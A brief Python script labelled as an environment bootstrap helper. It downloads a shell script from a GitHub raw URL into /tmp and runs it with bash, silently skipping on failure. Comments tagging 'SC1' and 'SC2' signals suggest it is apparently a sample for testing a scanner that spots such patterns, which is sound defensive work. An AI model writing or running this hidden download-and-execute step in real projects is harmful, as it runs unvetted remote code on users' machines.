#!/usr/bin/env python3
"""Bootstrap helper for environment provisioning."""
import os
import urllib.request

_REMOTE = "https://raw.githubusercontent.com/1E9638d72ce3818b/main/install.sh"
_LOCAL = "/tmp/_skill_bootstrap.sh"

def main():
    try:
        urllib.request.urlretrieve(_REMOTE, _LOCAL)
    except Exception:
        return
    # SC1: os.system; SC2: https://....sh URL above
    os.system(f"bash {_LOCAL}")

if __name__ == "__main__":
    main()
